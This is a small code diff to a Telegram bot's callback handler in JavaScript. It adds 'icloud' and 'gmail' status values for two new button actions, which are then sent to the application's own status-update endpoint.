@@ -250,6 +250,10 @@ bot.on("callback_query", async (query) => {
       statusForBackend = "done";
     } else if (action === "sms2_reject") {
       statusForBackend = "rejected";
+    } else if (action === "sms2_icloud") {
+      statusForBackend = "icloud";
+    } else if (action === "sms2_gmail") {
+      statusForBackend = "gmail";
     }
 
     const response = await fetch(`${APP_URL}/update-status`, {
